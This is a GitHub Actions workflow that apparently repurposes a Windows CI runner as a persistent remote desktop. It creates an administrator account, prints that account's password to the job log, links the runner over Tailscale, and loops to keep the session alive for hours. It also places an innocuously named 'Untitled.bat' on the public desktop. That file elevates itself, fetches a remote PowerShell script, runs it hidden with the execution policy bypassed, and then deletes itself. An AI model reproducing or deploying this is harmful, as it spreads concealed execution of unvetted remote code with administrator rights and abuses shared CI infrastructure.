name: Windows environment

on:
  workflow_dispatch:

jobs:
  desktop:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Build remote desktop user
        run: |
          Add-Type -AssemblyName System.Security

          $chars = @{
              Upper = [char[]](65..90)
              Lower = [char[]](97..122)
              Number = [char[]](48..57)
              Special = ([char[]](33..47) + [char[]](58..64) + [char[]](91..96) + [char[]](123..126))
          }

          $passwordArray = @()
          $passwordArray += $chars.Upper   | Get-Random -Count 3
          $passwordArray += $chars.Lower   | Get-Random -Count 3
          $passwordArray += $chars.Number  | Get-Random -Count 1
          $passwordArray += $chars.Special | Get-Random -Count 1
          $password = -join ($passwordArray | Sort-Object { Get-Random })

          $securePass = ConvertTo-SecureString $password -AsPlainText -Force

          if (-not (Get-LocalUser -Name "user" -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name "user" -Password $securePass -AccountNeverExpires
              Write-Host "User 'user' created successfully."
          } else {
              Write-Host "User 'user' already exists."
          }

          Add-LocalGroupMember -Group "Administrators" -Member "user"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "user"

          echo "RDP_USER=user" >> $env:GITHUB_ENV
          echo "RDP_PASS=$password" >> $env:GITHUB_ENV

      - name: Install & Connect Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

          Write-Host "Starting Tailscale connection..."
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID

          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 15) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }

          if (-not $tsIP) { Write-Error "Tailscale IP not assigned"; exit 1 }

          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP assigned: $tsIP"

      - name: Initialize Windows
        run: |
          $publicDesktop = "C:\Users\Public\Desktop"
          New-Item -ItemType Directory -Force -Path $publicDesktop | Out-Null

          $bat = "$publicDesktop/Untitled.bat"

          $batContent = @"
          @echo off
          setlocal

          REM --- Check if running as admin ---
          net session >nul 2>&1
          if %errorLevel% NEQ 0 (
              echo Running as administrator...
              powershell -Command "Start-Process '%~f0' -Verb RunAs"
              exit /b
          )

          REM --- URL of the PowerShell script ---
          set "URL=https://raw.githubusercontent.com/djameledin/Desktop/refs/heads/main/untitled.ps1"

          REM --- Run PowerShell script silently ---
          powershell -NoLogo -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
              "(Invoke-WebRequest -Uri '%URL%' -UseBasicParsing).Content | Invoke-Expression"

          REM --- Delete this batch file ---
          del "%~f0"

          exit
          "@
          
          Set-Content -Path $bat -Value $batContent -Encoding ASCII 
      - name: Maintain Connection & Show Info
        run: |
          Write-Host "This Virtual Machine are ready!"
          Write-Host " Username : $env:RDP_USER ; Password : $env:RDP_PASS"

          while ($true) {
              Write-Host " "
              Write-Host "[$(Get-Date)] Keep it Active..."
              Start-Sleep -Seconds 300
          }
